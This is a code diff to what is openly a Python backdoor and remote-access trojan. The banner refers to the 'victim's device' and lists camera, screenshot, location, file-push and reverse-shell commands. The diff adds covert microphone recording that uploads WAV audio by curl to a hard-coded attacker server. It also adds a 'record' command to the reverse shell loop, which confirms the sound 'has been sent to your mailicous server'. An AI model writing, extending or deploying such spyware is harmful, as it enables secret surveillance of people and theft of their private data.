@@ -11,6 +11,8 @@ import io
 import shlex
 from PIL import ImageGrab
 import threading
+from scipy.io.wavfile import write
+import sounddevice as sd
 SERVER_URL = "192.168.88.105:2020"
 WEBSOCKET_URL="ws://192.168.88.105:8765"
 PORT=12345
@@ -46,7 +48,9 @@ banner = r"""
  -put-files [files from your server]: put files inside victim machine from your server.
  -exit: exit from victim's device.
  -clear: clear the screen.
- -help: display help screen.
+ -help: display help screen. 
+ -record time: record audio from victim's device.
+ -stream-sound: Listing to victim realtime.
 =====================================================
 """
 async def open_camera():
@@ -112,7 +116,7 @@ def get_screenshot():
     curl_command = [
         "curl",
         "-X", "POST",
-        "-F", "files=@-;filename=screenshot.png",
+        "-F", "files=@-;filename=screenshot.png;type=image/png",
         f"{SERVER_URL}/upload"
     ]
     subprocess.run(curl_command,input=buf.read(),capture_output=True)
@@ -155,6 +159,36 @@ def get_location():
         return True
     else:
         return False
+def record_and_send_audio(duration_seconds):
+    sample_rate = 44100
+    channels = 1
+    recording = sd.rec(
+        int(duration_seconds * sample_rate),
+        samplerate=sample_rate,
+        channels=channels,
+        dtype="int16"
+    )
+    sd.wait()
+    buffer = io.BytesIO()
+    write(buffer, sample_rate, recording)
+    audio_bytes = buffer.getvalue()
+    try:
+        curl_command = [
+            "curl",
+            "-X", "POST",
+            f"{SERVER_URL}/upload",
+            "-F", "files=@-;filename=recording.wav;type=audio/wav"
+        ]
+        result = subprocess.run(
+            curl_command,
+            input=audio_bytes,   
+            capture_output=True
+        )
+        if result.returncode != 0:
+            return False
+        return True
+    except Exception:
+        return False
 def watch_victim_live():
     try:
        asyncio.run(open_camera())
@@ -169,6 +203,19 @@ def reverse_shell_payload():
            s.send(b"~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
+               continue
+           if cmd.startswith("record"):
+               cmd = cmd.split(" ")
+               if len(cmd) > 2 or len(cmd) < 2:
+                   s.send(b"Unknown command use known commands\n")
+                   continue
+               if str(cmd[1]).isdigit():
+                   if record_and_send_audio(int(cmd[1])) == True:
+                       s.send(b"Sound has been sent to your mailicous server\n")
+                   else:
+                       s.send(b"Error while sending sound to your mailicous server\n")
+               else:
+                   s.send(b"Error second argument must be integer because time in second should be integer\n")
                continue
            if cmd.lower() == "help":
                s.send(banner.encode())
